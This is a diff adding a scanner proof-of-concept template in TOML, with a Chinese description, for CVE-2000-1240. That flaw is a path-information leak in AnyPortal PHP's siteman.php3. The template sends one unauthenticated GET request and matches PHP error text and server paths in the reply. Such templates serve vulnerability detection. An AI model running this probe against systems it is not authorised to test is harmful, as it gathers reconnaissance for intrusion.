@@ -1,0 +1,47 @@
+[info]
+author = "AVE"
+description = "AnyPortal(php) 22 APR 00 之前版本中 siteman.php3 存在路径信息泄露漏洞。远程攻击者直接访问该文件可触发 PHP 错误信息，导致服务器绝对路径泄露。该漏洞无需身份认证，可远程利用，泄露的路径信息可为后续攻击提供侦察基础。"
+id = "POC-AVE-2000-1166"
+name = "AnyPortal PHP siteman.php3 路径信息泄露 PoC"
+severity = "medium"
+tags = [
+    "cve-2000-1240",
+    "path-disclosure",
+    "information-leak",
+]
+vuln_id = [
+    "CVE-2000-1240",
+    "AVE-2000-1166",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/siteman.php3"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Warning:",
+    "Fatal error:",
+    "Parse error:",
+    "/home/",
+    "/var/www/",
+    "/usr/local/",
+    "on line",
+    "in /",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
